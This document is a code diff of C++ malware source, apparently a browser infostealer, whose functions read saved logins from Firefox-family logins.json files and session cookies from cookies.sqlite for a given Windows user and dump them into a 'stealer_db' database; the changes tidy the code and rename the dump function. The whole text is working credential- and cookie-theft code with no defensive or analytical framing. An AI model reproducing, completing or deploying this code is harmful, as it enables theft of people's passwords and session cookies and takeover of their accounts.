@@ -18,22 +18,15 @@ std::vector<std::string> browsers_gecko = {
 
 BOOL gecko_parser(std::string username, std::string stealer_db)
 {
-	//Hold data
-	//DataHolder* data_array = new DataHolder[SQLITE_ROW];
-	//int data_index = 0;
-
 	std::vector<DataHolder> data_list;
 
 	std::string target_user_data;
 	for (const auto& dir : browsers_gecko) {
-
 		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
-
 		try {
 			if (exists(target_user_data) && is_directory(target_user_data)) {
 				for (const auto& entry : directory_iterator(target_user_data)) {
 					if (entry.is_directory() && exists(entry.path() / "logins.json")) {
-						//std::cout << entry.path() << '\n';
 
 						// Read the JSON file
 						std::ifstream file(entry.path() / "logins.json");
@@ -74,10 +67,6 @@ BOOL gecko_parser(std::string username, std::string stealer_db)
 							data.setPassword(password);
 							data.setHost(dir);
 
-							/*data_array[data_index].setUsername(username);
-							data_array[data_index].setPassword(password);
-							data_array[data_index++].setHost(dir);*/
-
 							data_list.push_back(data);
 						}
 					}
@@ -92,7 +81,7 @@ BOOL gecko_parser(std::string username, std::string stealer_db)
 		}
 	}
 
-	if (!dump_data(stealer_db, data_list, data_list.size()))
+	if (!dump_password_data(stealer_db, data_list, data_list.size()))
 		return false;
 
 	return true;
@@ -100,10 +89,6 @@ BOOL gecko_parser(std::string username, std::string stealer_db)
 
 BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 {
-	//Hold data
-	//DataHolder* data_array = new DataHolder[];
-	//int data_index = 0;
-
 	std::vector<DataHolder> data_list;
 
 	std::string target_user_data;
@@ -111,7 +96,6 @@ BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 	for (const auto& dir : browsers_gecko) {
 
 		target_user_data = "C:\\users\\" + username + "\\" + gecko_paths + dir + "Profiles";
-
 		try {
 			if (exists(target_user_data) && is_directory(target_user_data)) {
 				for (const auto& entry : directory_iterator(target_user_data)) {
@@ -119,7 +103,6 @@ BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 						//std::cout << entry.path() << '\n';
 
 						target_cookie_data = entry.path().string() + "\\cookies.sqlite";
-
 						sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT  host, name, path, value, expiry FROM moz_cookies");
 
 						if (stmt == nullptr)
@@ -136,16 +119,6 @@ BOOL gecko_cookie_collector(std::string username, std::string stealer_db)
 							char* expiry = (char*)sqlite3_column_text(stmt, 4);
 
 							if (host != nullptr && name != nullptr && path != nullptr && value != nullptr && expiry != nullptr) {
-
-								//if ((strlen(host) == 0) || (strlen(value) == 0) || (strlen(expiry) == 0))
-									//continue;
-
-								//data_array[data_index].setUrl(host);
-								//data_array[data_index].setHost(dir);
-								//data_array[data_index].setCookieName(name);
-								////data_array[data_index].setCookiePath(path);
-								//data_array[data_index].setCookies(value);
-								//data_array[data_index++].setCookieExpiry(expiry);
 
 								data.setUrl(host);
 								data.setHost(dir);
